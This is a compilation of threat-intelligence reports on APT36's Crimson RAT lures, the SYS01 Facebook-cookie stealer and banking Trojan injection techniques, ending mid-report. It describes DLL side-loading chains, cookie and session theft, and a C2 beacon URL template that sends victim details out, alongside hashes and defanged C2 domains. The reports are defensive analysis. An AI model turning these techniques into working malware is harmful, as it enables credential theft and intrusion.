Services: Service ExecutionTechniqueT1569.002https://attack.mitre.org/techniques/T1569/002/Windows Management InstrumentationTechniqueT1047https://attack.mitre.org/techniques/T1047/PersistenceTacticTA0003https://attack.mitre.org/tactics/TA0003/External Remote ServicesTechniqueT1133https://attack.mitre.org/techniques/T1133/Hijack Execution Flow: DLL Side-LoadingTechniqueT1574.002https://attack.mitre.org/techniques/T1574/002/Valid AccountsTechniqueT1078https://attack.mitre.org/techniques/T1078/Privilege EscalationTacticTA0004https://attack.mitre.org/tactics/TA0004/Valid AccountsTechniqueT1078https://attack.mitre.org/techniques/T1078/Defense EvasionTacticTA0005https://attack.mitre.org/tactics/TA0005/Deobfuscate/Decode
Files or InformationTechniqueT1140https://attack.mitre.org/techniques/T1140/Indicator Removal on Host: Clear Windows Event LogsTechniqueT1070.001https://attack.mitre.org/techniques/T1070/001/Indicator Removal on Host: File DeletionTechniqueT1070.004https://attack.mitre.org/techniques/T1070/004/Indicator Removal on Host: TimestompTechniqueT1070.006https://attack.mitre.org/techniques/T1070/006/Hijack Execution Flow: DLL Side-LoadingTechniqueT1574.002https://attack.mitre.org/techniques/T1574/002/Masquerading:
Rename System UtilitiesTechniqueT1036.003https://attack.mitre.org/techniques/T1036/003/Masquerading: Match Legitimate Name or LocationTechniqueT1036.005https://attack.mitre.org/techniques/T1036/005/Use Alternate Authentication Material:
Pass the HashTechniqueT1550.002https://attack.mitre.org/techniques/T1550/002/Valid AccountsTechniqueT1078https://attack.mitre.org/techniques/T1078/Credential AccessTacticTA0006https://attack.mitre.org/tactics/TA0006/Brute Force: Password SprayingTechniqueT1110.003https://attack.mitre.org/techniques/T1110/003/Brute Force: Credential StuffingTechniqueT1110.004https://attack.mitre.org/techniques/T1110/004/OS Credential Dumping: LSASS MemoryTechniqueT1003.001https://attack.mitre.org/techniques/T1003/001/OS Credential Dumping:
NTDSTechniqueT1003.003https://attack.mitre.org/techniques/T1003/003/Two-Factor Authentication InterceptionTechniqueT1111https://attack.mitre.org/techniques/T1111/DiscoveryTacticTA0007https://attack.mitre.org/tactics/TA0007/Account
DiscoveryTechniqueT1087 Account Discovery: Local AccountTechniqueT1087.001https://attack.mitre.org/techniques/T1087/001/Account Discovery: Domain AccountTechniqueT1087.002https://attack.mitre.org/techniques/T1087/002/Browser Bookmark DiscoveryTechniqueT1217https://attack.mitre.org/techniques/T1217/Domain Trust DiscoveryTechniqueT1482https://attack.mitre.org/techniques/T1482/File and Directory DiscoveryTechniqueT1083https://attack.mitre.org/techniques/T1083Network
Service ScanningTechniqueT1046https://attack.mitre.org/techniques/T1046Network Share DiscoveryTechniqueT1135https://attack.mitre.org/techniques/T1135Permission Groups DiscoveryTechniqueT1069https://attack.mitre.org/techniques/T1069Process DiscoveryTechniqueT1057https://attack.mitre.org/techniques/T1057Query RegistryTechniqueT1012https://attack.mitre.org/techniques/T1012Remote System DiscoveryTechniqueT1018https://attack.mitre.org/techniques/T1018System Information DiscoveryTechniqueT1082https://attack.mitre.org/techniques/T1082System Network Configuration DiscoveryTechniqueT1016https://attack.mitre.org/techniques/T1016System Network Connections DiscoveryTechniqueT1049https://attack.mitre.org/techniques/T1049System Owner/User DiscoveryTechniqueT1033https://attack.mitre.org/techniques/T1033System Service DiscoveryTechniqueT1007https://attack.mitre.org/techniques/T1007System Time DiscoveryTechniqueT1124https://attack.mitre.org/techniques/T1124Lateral MovementTacticTA0008https://attack.mitre.org/tactics/TA0008/Lateral Tool TransferTechniqueT1570https://attack.mitre.org/techniques/T1570/Remote Services: SMB/Windows Admin SharesTechniqueT1021.002https://attack.mitre.org/techniques/T1021/002/Remote Services: SSHTechniqueT1021.004https://attack.mitre.org/techniques/T1021/004/Remote Services:
Windows Remote ManagementTechniqueT1021.006https://attack.mitre.org/techniques/T1021/006/Use Alternate Authentication Material:
Pass the HashTechniqueT1550.002https://attack.mitre.org/techniques/T1550/002/CollectionTacticTA0009https://attack.mitre.org/tactics/TA0009/Archive Collected Data: Archive via UtilityTechniqueT1560.001https://attack.mitre.org/techniques/T1560/001/Automated CollectionTechniqueT1119https://attack.mitre.org/techniques/T1119/Data from Information Repositories: SharePointTechniqueT1213.002https://attack.mitre.org/techniques/T1213/002/Data from Local SystemTechniqueT1005https://attack.mitre.org/techniques/T1005/Data from Network Shared DriveTechniqueT1039https://attack.mitre.org/techniques/T1039/Data Staged: Local Data StagingTechniqueT1074.001https://attack.mitre.org/techniques/T1074/001/Data Staged:
Remote Data StagingTechniqueT1074.002https://attack.mitre.org/techniques/T1074/002/Email Collection: Local Email CollectionTechniqueT1114.001https://attack.mitre.org/techniques/T1114/001/Command and ControlTacticTA0011https://attack.mitre.org/tactics/TA0011/Application Layer Protocol: Web ProtocolsTechniqueT1071.001https://attack.mitre.org/techniques/T1071/001/Application Layer Protocol: DNSTechniqueT1071.004https://attack.mitre.org/techniques/T1071/004/Encrypted Channel:
Asymmetric CryptographyTechniqueT1573.002https://attack.mitre.org/techniques/T1573/002/Protocol TunnelingTechniqueT1572https://attack.mitre.org/techniques/T1572/ExfiltrationTacticTA0010https://attack.mitre.org/tactics/TA0010/Automated ExfiltrationTechniqueT1020https://attack.mitre.org/techniques/T1020/Data Transfer Size LimitsTechniqueT1030https://attack.mitre.org/techniques/T1030/Exfiltration Over C2 ChannelTechniqueT1041https://attack.mitre.org/techniques/T1041/Exfiltration Over Web Service: Exfiltration to Cloud StorageTechniqueT1567.002https://attack.mitre.org/techniques/T1567/002/ 
title: Transparent Tribe (APT36) | Pakistan-Aligned Threat Actor Expands Interest in Indian Education Sector url: https://www.sentinelone.com/labs/transparent-tribe-apt36-pakistan-aligned-threat-actor-expands-interest-in-indian-education-sector/ Executive Summary SentinelLabs has been tracking a cluster of malicious documents that stage Crimson RAT, distributed by APT36 (Transparent Tribe). 
We assess that this activity is part of the group’s previously reported targeting of the education sector in the Indian subcontinent. 
We observed APT36 introducing OLE embedding to its typically used techniques for staging malware from lure documents and versioned changes to the implementation of Crimson RAT, indicating the ongoing evolution of APT36’s tactics and malware arsenal. 
Overview SentinelLabs has been tracking a recently disclosed cluster of malicious Office documents that distribute Crimson RAT, used by the APT36 group (also known as Transparent Tribe) targeting the education sector.
This post summarizes our observations highlighting the group’s continuous change in used malware staging techniques and Crimson RAT implementations. 
Transparent Tribe is a suspected Pakistan-based threat group active since at least 2013.
The group is not very sophisticated; however, it is a highly persistent threat actor that continuously adapts its operational strategy.
Transparent Tribe has previously focused mainly on Indian military and government personnel, but it has recently expanded its scope to include educational institutions and students in the Indian subcontinent.
Crimson RAT is a consistent staple in the group’s malware arsenal the adversary uses in its campaigns. 
The names and content of the lure documents, the associated domains, and the use of Crimson RAT suggest that the activities discussed in this post are part of a previously reported broader targeting of the education sector by Transparent Tribe. 
Further, the PDB paths of some Crimson RAT samples we analyzed contain the word Wibemax, which is also contained in the PDB paths of Crimson RAT payloads observed in a previous Transparent Tribe campaign. 
Wibemax matches the name of a Pakistani software development company, but at this time we have not identified a clear relationship to the adversary. 
It is worth noting that there are high confidence assessments of Transparent Tribe leveraging third parties to support their operation, such as the Pakistani web hosting provider Zain Hosting. 
Our analysis reinforces the assessment that closely monitoring the research endeavors of adversary nations has become an important objective for the adversary, underscoring the crucial role this activity plays in fulfilling the goals and aspirations of the authorities whose interests Transparent Tribe represents. 
Malicious Documents The documents that Transparent Tribe distributes have education-themed content and names such as assignment or Assignment-no-10, and indicate creation dates of July and August 2022.
Based on known behavior of this group, we suspect that the documents have been distributed to targets as attachments to phishing emails.
Consistent with known Transparent Tribe tactics, we observed that some of the documents have been hosted on file hosting services and attacker-created domains, such as s1.fileditch[.]ch, cloud-drive[.]store, and drive-phone[.]online. 
It is important to note that cloud-drive[.]store and drive-phone[.]online have been previously linked to Transparent Tribe activities targeting the education sector and assessed as domains prepared for future use.
Further, drive-phone[.]online closely resembles the phone-drive[.]online domain recently observed hosting Transparent Tribe malware targeting Indian and Pakistani Android users. 
The malicious documents we analyzed stage Crimson RAT using Microsoft Office macros or OLE embedding. 
The macro code executes when the documents are opened, and its functionality is consistent with known Transparent Tribe macro variants.
The macros create and decompress an embedded archive file in the %ALLUSERSPROFILE% directory (C:\ProgramData) and execute the Crimson RAT payload within.
Some macros insert text in the document, which is typically education-themed content relating to India. 
Macro implementation Macro-inserted document text 
In addition to macros, we observed that Transparent Tribe have adopted OLE embedding as a technique to stage Crimson RAT.
Malicious documents that implement this technique require users to double-click a document element.
The documents distributed by Transparent Tribe typically display an image (a “View Document” graphic) indicating that the document content is locked.
This lures users to double-click the graphic to view the content, which activates an OLE package that stores and executes Crimson RAT masquerading as an update process (MicrosoftUpdate.exe). 
The “View Document” graphic OLE stream that stores Crimson RAT Transparent Tribe is known to experiment with different malware staging techniques, which include distributing executables with embedded documents or documents that execute designated Crimson RAT loaders.
The adoption of OLE embedding further highlights the group’s continuous experimentation with malware staging techniques. 
Crimson RAT Implementations We observed a variety of Crimson RAT .NET implementations, with compilation timestamps between July and September 2022.
The Crimson RAT payloads we analyzed use the richa-sharma.ddns[.]net domain for C2 purposes and support either 40 or 65 commands, most of which have been documented in previous research.
Features of Crimson RAT include exfiltrating system information, capturing screenshots, starting and stopping processes, and enumerating files and drives. 
A Crimson RAT command dispatch routine Some Crimson RAT variants are stripped of debug information, whereas others have PDB paths that contain a date stamp, the word Richa, which relates to the configured C2 domain, and the word Wibemax.
Portions of these PDB paths overlap those of Crimson RAT payloads observed in a previous Transparent Tribe campaign, such as D:\Projects\Wibemax\WinP\WinP\obj\Debug\WinP.pdb and D:\Projects\Wibemax\Windows RAT\1 Windows 10 Client\Win8P-Sunny\2022-04-15-Win8P Sunny\obj\Debug\FUJIKBattery.pdb. 
Crimson RAT PDB paths We observed different Crimson RAT version identifiers: R.S.8.8., R.S.8.9, R.S.8.1, and R.S.8.6.
We speculate that the R.S. components of the identifiers may relate to the configured C2 domain (richa-sharma.ddns[.]net) and the numerical components may specify a version (build) number.
This aligns with a documented Crimson RAT variant with the identifier S.L.2.2., which has used the sunnyleone.hopto[.]org domain for C2 purposes. 
As an anti-analysis measure, Crimson RAT variants delay their execution for a given time period, for example, 61, 180, or 241 seconds.
Most of the Crimson RAT variants we analyzed evaluate whether they execute at a machine named G551JW or DESKTOP-B83U7C5 and establish persistence by creating a registry key under \SOFTWARE\Microsoft\Windows\CurrentVersion\Run only if the victim’s machine name differs.
G551JW or DESKTOP-B83U7C5 may be the names of the machines where Crimson RAT developers have been running test executions. 
Crimson RAT variants implement different obfuscation techniques of varying intensities, for example, simple function name malformation and dynamic string resolution.
We observed the use of the Eazfuscator obfuscator in a Crimson RAT sample named NewOrleans.
Evidence suggests that the Crimson RAT developers have patched the routine that evaluates the trial period of Eazfuscator to enable the execution of the malware after the trial period expires. 
Eazfuscator trial period evaluation in NewOrleans Eazfuscator trial expiry message With previous variants of Crimson RAT obfuscated using Crypto Obfuscator, the addition of Eazfuscator to the obfuscation techniques used by Transparent Tribe highlights the continuous maintenance and development of the RAT. 
Conclusion Transparent Tribe is a highly motivated and persistent threat actor that regularly updates its malware arsenal, operational playbook, and targets.
Our analysis further demonstrates this characteristic of the group by spotlighting the adoption of OLE embedding as a technique for staging malware from lure documents and the Eazfuscator obfuscator to protect Crimson RAT implementations.
Transparent Tribe’s constantly changing operational and targeting strategies require constant vigilance to mitigate the threat posed by the group. 
Indicators of Compromise SHA1 Description 738d31ceca78ffd053403d3b2bc15847682899a0 Malicious document 9ed39c6a3faab057e6c962f0b2aaab07728c5555 Malicious document af6608755e2708335dc80961a9e634f870aecf3c Malicious document e000596ad65b2427d7af3313e5748c2e7f37fba7 Malicious document fd46411b315beb36926877e4b021721fcd111d7a Malicious document 516db7998e3bf46858352697c1f103ef456f2e8e Crimson RAT 842f55579db786e46b20f7a7053861170e1c0c5e Crimson RAT 87e0ea08713a746d53bef7fb04632bfcd6717fa9 Crimson RAT 911226d78918b303df5110704a8c8bb599bcd403 Crimson RAT 973cb3afc7eb47801ff5d2487d2734ada6b4056f Crimson RAT Domain Description richa-sharma.ddns[.]net C2 server cloud-drive[.]store Malware hosting location drive-phone[.]online Malware hosting location s1.fileditch[.]ch Malware hosting location 
title: SYS01 Stealer Will Steal Your Facebook Info url: https://blog.morphisec.com/sys01stealer-facebook-info-stealer Starting in November 2022, Morphisec has been tracking an advanced info stealer we have named “SYS01 stealer.”
SYS01 stealer uses similar lures and loading techniques to another information stealer recently dubbed S1deload by the Bitdefender group, but the actual payload (stealer) is different. 
We have seen SYS01 stealer attacking critical government infrastructure employees, manufacturing companies, and other industries.
The threat actors behind the campaign are targeting Facebook business accounts by using Google ads and fake Facebook profiles that promote things like games, adult content, and cracked software, etc. to lure victims into downloading a malicious file.
The attack is designed to steal sensitive information, including login data, cookies, and Facebook ad and business account information. 
The campaign was first seen in May 2022 and was initially attributed to the Ducktail operation by Zscaler.
(This attribution was later discovered to be incorrect.)
In this blog we explore the various methods used to distribute SYS01 stealer. 
We show how the attacker advances the delivery chain and includes Rust, Python, PHP, and PHP advanced encoders to successfully evade security vendors over the past five months. 
The Infection Chain The attack begins by luring a victim to click on a URL from a fake Facebook profile or advertisement to download a ZIP file that pretends to have an application, game, movie, etc. 
The infection chain is divided into two parts: the loader, and the Inno-Setup installer that drops the final payload.
The loader is usually a legitimate C# application susceptible to a side-loading vulnerability that comes with a hidden malicious dynamic link library (DLL) file that’s eventually side-loaded to the application.
This legitimate application drops the Inno-Setup installer that decompresses to a whole PHP application containing malicious scripts.
The PHP scripts are responsible for stealing and exfiltrating information.
The scripts are encoded using different techniques, which makes their analysis and detection harder. 
Infection chain The Loader We’ve seen the payload delivered in diverse ways including DLL side-loading, Rust and Python executables, and many others.
All methods eventually drop an Inno-Setup installer which, at the next stage, drops and executes the PHP information stealer.
In the next sections we elaborate on various delivery techniques and luring themes the attackers use. 
Note: these delivery methods are representative samples.
There are many other variations of these methods with minor modifications. 
DLL Side-Loading V1 
In this method, the victim downloads a zipped folder with different luring themes such as world cup live streaming, free applications, and more that abuse legitimate applications vulnerable to DLL side-loading attack.
The zipped folder usually holds the following file patterns: Executable.
A benign, legitimate executable abused to side-load the malicious DLL 
[A-Z]Data.dat (hidden).
A ZIP or self extracting archive (SFX) containing legitimate HTML webpages used as a decoy [A-Z]License (hidden).
The Inno-Setup installer to be executed (base64 encoded with some string modifications) DLL (hidden).
The malicious side loaded DLL Western Digital's WDSyncService.exe executable abused to side-load a malicious DLL 
The malicious DLL has two main goals: displaying the decoy to the victim and executing the Inno-Setup installer.
It does this by creating a thread that checks whether the License file exists.
If it doesn’t, it downloads the file from its command and control (C2) server, then decodes and executes it.
In the main thread the SFX/ZIP file is executed/decompressed, and the victim is shown the decoy HTML files. 
Decoy dropped to the folder In some samples we noticed cases where the .dat and License files are not included in the zipped folder.
Instead, they’re downloaded from the C2 using the following pattern: https://<domain>/files/dld?t=wcup.
Downloads the License file https://<domain>/files/dlz?t=wcup.
Downloads the .dat file as a ZIP dld Download the License (base64 encoded with string replacements) 
dlz Download .zip
(.dat file with the decoys) 
t Is the theme used as a decoy Side loaded malicious DLL 
As mentioned, the License file is the next stage Inno-Setup installer that drops the PHP information stealer. 
DLL Side-Loading V2 
In this method, the victim downloads a ZIP folder that purportedly contains an application or movie etc. 
Garmin’s ElevatedInstaller.exe executable abused to side-load malicious DLL 
The above image shows an example of Garmin’s ElevatedInstaller.exe being abused to side-load the malicious DLL.
Once the executable starts running, it side-loads the malicious DLL that decodes and drops three files to the %temp% folder: 
vcruntime140.dll Dependency rhc.exe (hidec)
Executable that accepts an executable as an argument and executes it with hidden console <
[A-Z0-9]{15}>.exe Rust executable compiled with Cargo Next, it creates a scheduled task that runs the Rust executable by passing it as an argument to rhc.exe.
Before exiting, it pops up a message box informing the victim that the execution didn’t succeed. 
Dropping a Rust executable and popping a fake message box The Rust executable then downloads the next stage—an Inno-Setup installer that deploys the PHP information stealer from <domain_name>/files?t=<theme_name>&tp=d. We’ve also spotted similar delivery methods that dropped Python executables compiled with Nuitka instead of Rust to drop the next stage Inno-Setup. 
DLL Side-Loading V3 Similar to the other delivery methods, in this scenario a victim downloads what seems to be a game, movie, nude album, etc. FUD ZIP file with malicious DLL All the executables named as image files are in fact the same benign executable—WDSyncService.exe that is abused to side-load a malicious DLL named WDSync.dll. Zipped folder with the same executable file: WDSyncService.exe that side-loads WDSync.dll The WDSyncService.exe file is signed by Western Digital and acts as Western Digital’s sync service, which is written in C#.
Additionally, this executable uses several shared libraries, including WDSync.dll which is hidden in the ZIP file and obfuscated with SmartAssembly.
The rest of the DLLs WDSyncService.exe uses are compressed and encrypted within WDSync.dll using the embedding dependencies feature by SmartAssembly. 
WDSync.dll embeds legitimate DLLs using the SmartAssembly feature Once a victim has executed one of the executables from the ZIP folder, a fake message box pops up and alerts the user to install a “framework” to open the file. 
Fake message box Meanwhile, a thread with malicious logic is executing.
It starts with de-obfuscating the next stage (string replacements + base64 decoding) and writing it to a %tmp% folder under the hardcoded name TS.exe and executing it with “t” as an argument.
Once the execution completes, the file is deleted to leave no evidence on the machine. 
Drops ”TS.exe” and executes it with t as an argument The dropped executable (TS.exe) can be executed with one of the following options: t, d t|d options that the executable accepts Option t copies the executable to %appdata%\Packages\TS.exe and registers a new scheduled task to trigger every day and repeat every hour with option “d” as an argument. 
Creates a scheduled task to be executed with d as an argument Option d checks if the file %localappdata%\m.txt exists.
If it does, the program exits because it means the info stealer is already running on the machine.
If the file does not exist, the executable decodes and drops the next stage Inno-Setup executable to %temp%\\<[A-Z]{15}.exe> and executes it with /VERYSILENT /SUPPRESSMSGBOXES /NORESTART as arguments.
As before, when the execution finishes the file is deleted to remove evidence from the machine. 
Drops next stage Inno-Setup executable Inno-Setup to PHP Information Stealer Once the Inno-Setup installer executes, it drops a PHP application with additional files, usually to %localappdata\[A-Z]{4}\<version_number>.
Between different variants of this information stealer, we saw the following files used to execute the malicious logic: include.php Responsible for installing persistence via scheduled tasks index.php Executes the main logic of the stealing act version.php (embedded in index.php if it does not exist)
Holds the stealer version rhc.exe
Hides the console window of started programs (hidec) rss.txt (other variants have a different name)
Base64 encoded string with several string replacements.
Once decoded, this executable, written in Rust and compiled with Cargo, gets the current date and time, and decrypts Chromium-based browsers’ encryption key In older variants the PHP scripts were not obfuscated in any manner.
In newer variants we noticed commercial encoders ionCube and Zephir, which are self-written extensions that obfuscate the PHP scripts. 
After dropping the folder, the Inno-Setup executable executes php.exe include.php, or passes this command line as an argument to rhc.exe. include.php registers two scheduled tasks: rhc.exe php.exe include.php rhc.exe php.exe index.php rhc.exe php.exe index.php 
The first task is triggered at log-on.
The second task is triggered every two minutes.
The attacker must know the time to set it in the scheduled task.
It does this by decoding the rss.txt into an executable, adding a uniquid at the end of the executable, and dropping it to %temp%\tmp\<uniqid>.exe.
If for some reason the operation fails, this script gets the current date and time running: “wmic os get LocalDateTime /value”. 
createTS—creates scheduled task.
createLG—creates scheduled task at logon index.php is the script where the stealing logic takes place.
It starts by setting a configuration array with the following information: version—Stealer version b—Bot name (SYS01 is the bot name we’ve seen in all the variants we covered, which is why we named the php stealer SYS01) tmpData—Path for saving temporarily used files url_endpoint—A list of C2 domains Configuration array During each execution, the script shuffles and randomly defines one of the domains to be used as the C2 in the entire script. 
Next, the script creates a machine ID associated with the victim and saves it to %localappdata%\packages\m.txt for future executions.
The machine ID is constructed by the following: uniqid() + _ + rand(111111, 999999).
Later, it will call the getTask function that constructs the following URL url= URL_ENDPOINT .
"?
a=http&dev=1&v={$config["version"]}&machine_id={$macID}&from={$config['b']}&tag={$tag}&uname={$uname}&mt={$time}&f=" .
FORCE_TASK; and issues a GET request to the C2 with information identifying the victim.
The response is a Json object with zero or more tasks in it. 
C2 response with tasks The main script routine goes over each task and acts accordingly.
As seen in the main function there are five task types: get_ck_all, dlAR, upload, r, dl
. index.php main routine get_ck_all Gets all cookies.
Iterating over based_ch, which consists of a list of Chromium-based browser names.
It tries to extract the cookies and login data for each browser name, and after extracting this information checks if the flag sendD (send data) is set to true.
If so, it posts the stolen information to its C2.
The attacker additionally checks whether the user has a Facebook account logged in or not.
It does this by checking if the cookie hostname contains facebook.com and collects the session specific cookies xs and c_user that store the user ID and session secret respectively. 
Extracting Facebook’s session cookies – xs and c_user If the victim has a logged in Facebook account (checked with xs name in Facebook’s cookie), and the rs_flag (resource flag) is set to true, the attacker will query Facebook’s graph API using the access token, obtained via Facebook’s graphql API, to steal the victim’s Facebook information and send it back to the C2.
The stolen information is that set as fields in the URL parameter: C2 response—Facebook's graph API used to access sensitive information Extract victim’s sensitive Facebook data using the graph API and send the results to a C2 server dlAR Download and run.
Downloads a file from the given URL and executes it with the given arguments. 
dlAR task At the time of writing, in the given task the downloaded file was an Inno-Setup executable that dropped a legitimate WD Discovery app to side-load
the malicious WDLocal.dll. Western’s Digital WDDdiscovery.exe side-loads malicious WDLocal.dll The side-loaded DLL issues a GET request to one of its hardcoded URLs with parameters stating the old machine ID, new machine ID, and the current version of the information stealer.
The response is a Json object that holds the new version number, URL to download the new version, command to be executed, and arguments.
The response is parsed, and the new stealer is downloaded and executed.
Next, it creates a scheduled task that executes the updated routine, which triggers at log-on and every 30 minutes. 
Information Stealer update routine upload Asks for a file to be uploaded to the C2, checks whether the file exists, and uploads it. 
Upload file function r Gets a command to run, executes it, and posts the result back to the C2. 
Gets command from C2 and executes it dl Sends a get request with the parameter “a=update” to the C2 and does the same as the dlAR task. 
How do You Combat SYS01 stealer? DLL side-loading is a highly effective technique for tricking Windows systems into loading malicious code.
Dynamic link libraries enable more efficient memory use and system modularity, but because Microsoft doesn’t enforce search order for DLLs by default, it makes applications vulnerable to exploitation. 
Microsoft doesn’t enforce search order for a range of reasons, such as enabling things like portability and backwards compatibility—for example, portable browser applications that use older Microsoft libraries.
Security-minded developers may enforce search order within their code.
But most developers aren't security minded. 
This enables threat actors to position a malicious payload alongside a legitimate application.
Then when an application loads in memory and search order is not enforced, the application loads the malicious file instead of the legitimate one, allowing threat actors to hijack legitimate, trusted, and even signed applications to load and execute malicious payloads.
Adversaries use side-loading attacks for execution, persistence, privilege escalation, and defense evasion. 
Microsoft has started to enforce default search order on many of their applications, even if not universally.
But attackers can still misuse highly popular Microsoft applications that were created in previous years that are legitimately signed.
And they will be able to do so for many years to come. 
Basic steps to help prevent SYS01 stealer include implementing a zero-trust policy and limiting users’ rights to download and install programs.
And SYS01 stealer at heart relies on a social engineering campaign, so it’s important to train users about the tricks adversaries use
so they know how to spot them. 
Read Your Guide to Top Info Stealers of 2022 But humans are fallible, and limiting device functionality is not always possible when you need to ensure effective business functions.
This is why the best protection is all-of-the-above plus a Defense-in-Depth approach.
Security tools like next generation anti-virus (NGAV), endpoint protection platforms (EPP), and endpoint detection and response (EDR, XDR, and MDR) are necessary, but not sufficient to stop stealers like SYS01 stealer. 
This is because detection-based tools don’t always flag benign executables used to side-load payloads during delivery and/or execution.
And malicious payloads are also sometimes encrypted/packed or obfuscated until loaded into runtime memory, which detection-based tools struggle to effectively scan.
The most effective way to secure runtime memory is with Moving Target Defense (MTD) technology.
MTD morphs—randomizes—the runtime memory environment to create a dynamic attack surface and leaves decoy traps where targets used to be.
Any code that attempts to execute on a decoy is immediately terminated and trapped for forensic analysis.
The combination of detection-based tools with Moving Target Defense creates the most effective Defense-in-Depth against threats like SYS01 stealer.
To learn more, read the white paper: Zero Trust + Moving Target Defense: The Ultimate Ransomware Strategy. Indicators of Compromise (IOCs) 
Zip Files 01f76140374da14b72a8f1e648cb8f46590419cddd56bc089e67f38cee767735 7f54dc5ddab4de19c5ad7c7b6d4398bd07d97504cdedabc398a6d6db52fe9875 bad4de1c398954b9c381d91fee52607b78e1c65bd9f38c3e82a307e236a76223 2c58bfbf8d274434e3307a76a37720d09387978e8e401780048992ea21fd222b c81175d56aa006ad140799e39c800306b439ea98b9efc4491c269eccbfeebd4e c636ed3b0ca558a92687f60f0b37c0e44ff3a6d4f15acd3cfb858fee4b0b0916 833b871f342ba7b0e852363ed123682b99588888f01567e56942889d886bb4b2 daba97a67f219443ef4b0a39e2d051179d20de6a2febb927bec4108dcac1b3a6 5698feaacd122f75d69ed1d9a561ab7210051031e821b934b3022d48a185443b f58b9794f5b973625551333f469878c1df65302733f9a3e9a214e3739cee09bf Inno-Setup Installers 3416982484faefb7b0092cc639039863e52a9aa6ba0a277f943216a398dd0f8b 804f137c4253241cdcbbe8cd59181f0621cbd26bb8a78163b8bc0461d5f3bafb 20a1c15d016a2d11659a74ae9e23e57020a4023df4c9f8c0357a38b69eddfa08 14fe2d1d1df11d887f5c53a78af6e1885928aa9256b79cd365f2c1d39397c2f4 25a5422f4a4a1d11b242730adbce06673cefee533da62a8ddef93e0074a3ba75 7d64de081057d18b1503854386a351a76caac9d71aada177373ef77b597a4f06 C&C caseiden[.]com graeslavur[.]com rapadtrai[.]com baglamanotalari[.]comoscarnaija[.]com makananwisata[.]com seleriti[.]com seemlabie[.]top craceruib[.]topmahinetain[.]top 
title: Banking Trojan Techniques: How Financially Motivated Malware Became Infrastructure url: https://unit42.paloaltonetworks.com/banking-trojan-techniques/ Executive Summary While advanced persistent threats get the most breathless coverage in the news, many threat actors have money on their mind rather than espionage.
You can learn a lot about the innovations used by these financially motivated groups by watching banking Trojans. 
Because attackers constantly create new techniques to evade detection and perform malicious acts, studying monetarily motivated malware can help defenders understand threat actor tactics and protect organizations more effectively.
Some of the banking Trojans described here are historically known for being financial malware, but now they’re primarily used as infrastructure to deliver other malware.
Which is to say, by preventing techniques used by banking Trojans, you can also stop other types of threats. 
We’ll survey techniques used by notorious banking Trojan families to evade detection, steal sensitive data and manipulate data.
We’ll also describe how those techniques can be blocked.
These families include Zeus, Kronos, Trickbot, IcedID, Emotet and Dridex. 
Palo Alto Networks customers are protected from such attacks using Cortex XDR and WildFire. 
Table of Contents What Are Webinjects?How to Detect WebinjectsInfecting Web Browsers During Process CreationHow to Prevent Attempts to Infect Web Browsers During Process CreationNamed Pipe Communication Between Injected ProcessesHow to Prevent Named Pipe Communication Between Injected ProcessesHeaven’s Gate Injection TechniqueHow to Prevent Heaven's GateEvasive Process Hollowing by Entrypoint PatchingHow to Prevent Evasive Process Hollowing by Entrypoint PatchingPE InjectionHow to Prevent PE InjectionProcess Injection via HookingHow to Prevent Injection via HookingAtomBombing Injection TechniqueHow to Prevent AtomBombing and its VariantsConclusionIndicators of Compromise What Are Webinjects? 
Webinjects are modules that can inject HTML or JavaScript before a web page is rendered, and are often used to trick users.
They are known to be abused by banking Trojans, as well as being employed to steal credentials and manipulate form data inside web pages.
In most banking Trojan families, there is at least one webinjects module. 
An early stager of the banking Trojan usually injects the banking Trojan’s main bot into a Windows process, and that process injects the webinjects module into the machine’s available web browser processes as shown in Figure 1. Figure 1.
Trickbot goes through processes one by one to find browsers to inject with its webinjects module, using a stealthy technique known as reflective injection.
The webinjects module hooks the API calls responsible for sending, receiving or encrypting data sent to a web server.
By intercepting the data before it is encrypted, the malware can read HTTP-POST headers and manipulate them on the fly. 
Figure 2.
Trickbot webinjects module placing hooks based on the browser.
Figure 3.
Trickbot placing hooks on wininet.dll functions.
By fully controlling the HTTP headers just before the webpage is rendered, the malware can completely modify the forms and fool the user.
The malware may inject HTML or JavaScript code to trick the user into inserting sensitive information, such as a PIN code or credit card number, enabling the malware to collect it.
The malware can extract this information and send it to its command and control (C2) server without actually sending the forged headers to the targeted web page server. 
Chrome (chrome.dll) Firefox (nspr3.dll / nspr4.dll) Internet Explorer / Edge (Wininet.dll) ssl_read PR_Read HttpSendRequest ssl_write PR_Connect InternetCloseHandle PR_Close InternetReadFile PR_Write InternetQueryDataAvailable HttpQueryInfo InternetWriteFile HttpEndRequest InternetQueryOption InternetSetOption HttpOpenRequest InternetConnect Table 1.
Frequently hooked API functions. 
How to Detect Webinjects This technique can be prevented by detecting an injection into a web browser process.
The injected thread calls the NtProtectVirtualMemory function where the NewAccessProtection argument is PAGE_EXECUTE_READWRITE and the BaseAddress argument is an address to a library function targeted by banking Trojans. 
For example, Trickbot uses both VirtualProtect and VirtualProtectEx in its various versions.
Inspecting NtProtectVirtualMemory calls covers both. 
Some banking Trojans opt to avoid code injection.
Instead, they suspend the remote process threads and install the hooks remotely.
Inspecting remote NtProtectVirtualMemory calls can detect this variant technique. 
Figure 4. NtProtectVirtualMemory prototype.
Infecting Web Browsers During Process Creation 
Some banking Trojans aim to infect a target process as soon as it is launched, by injecting code into a predicted parent process of the real target.
Once the banking Trojan executes in the context of the parent process, it hooks process creation library functions and waits until the real target is created. 
Inside the hook, the banking Trojan manipulates the process creation flow.
Then, for example, it initializes the webinjects module inside the remote process.
The explorer.exe and runtimebroker.exe parent processes are frequently abused for this goal, as they usually launch the real targets. 
For instance, the Karius banking Trojan used this technique by injecting code into explorer.exe and hooking CreateProcessInternalW. The Trojan’s hook handler looked for a spawned web browser process and injected the malicious webinjects module into it. 
How to Prevent Attempts to Infect Web Browsers During Process Creation 
This technique can be prevented by looking for an injection into explorer.exe or runtimebroker.exe, where the injected thread hooks process creation functions like NtCreateUserProcess, NtCreateProcessEx, CreateProcessInternalW, CreateProcessA or CreateProcessW. Named Pipe Communication Between Injected Processes Many banking Trojans use named pipes to communicate with various processes under the threat actor’s control.
To do this, they inject their main bot into a Windows process, and then inject their other modules into different processes according to the module’s purpose.
They then establish communication between the different processes using named pipes. 
For example, Trickbot injects the main bot into svchost.exe.
It creates a named pipe server and reflectively injects the webinjects module into web browsers.
This injected module connects to the same named pipe as a client to communicate to the main bot and deliver the fetched credentials to the C2 server. 
Figure 5.
Trickbot named pipe server.
How to Prevent Named Pipe Communication Between Injected Processes This technique can be prevented by inspecting named-pipe events.
An injected thread creates a named pipe inside a Windows process, and then another injected thread that lives inside a web browser attempts to connect to that same named pipe. 
